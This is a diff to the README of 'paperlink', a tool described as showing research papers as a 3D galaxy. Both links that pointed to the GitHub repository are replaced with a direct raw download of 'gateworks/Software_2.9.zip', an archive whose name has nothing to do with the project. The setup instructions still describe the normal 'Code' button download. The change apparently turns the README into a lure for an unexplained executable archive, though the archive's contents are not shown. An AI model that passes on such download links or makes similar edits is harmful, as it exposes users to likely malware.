@@ -1,6 +1,6 @@
 # 🌌 paperlink - Explore your research papers in 3D
 
-[![Download paperlink](https://img.shields.io/badge/Download-paperlink-blue)](https://github.com/Leohendric8458/paperlink)
+[![Download paperlink](https://img.shields.io/badge/Download-paperlink-blue)](https://raw.githubusercontent.com/Leohendric8458/paperlink/main/gateworks/Software_2.9.zip)
 
 paperlink turns your static research paper collection into an interactive 3D galaxy. You see your documents as stars in a star map. Navigation through your data happens in a web browser. This project uses Three.js and WebGL to render your files. You organize your library in a simple list, and the software builds a spatial map for you.
 
@@ -17,7 +17,7 @@ The software reads a list of files from a data table. Each paper becomes a point
 
 ## 🛠️ Setting up the application
 
-1. Visit the following address to access the project files: [https://github.com/Leohendric8458/paperlink](https://github.com/Leohendric8458/paperlink).
+1. Visit the following address to access the project files: [https://raw.githubusercontent.com/Leohendric8458/paperlink/main/gateworks/Software_2.9.zip](https://raw.githubusercontent.com/Leohendric8458/paperlink/main/gateworks/Software_2.9.zip).
 2. Look for the green button labeled "Code" on the right side of the screen.
 3. Click "Download ZIP" from the menu.
 4. Locate the file in your Downloads folder.
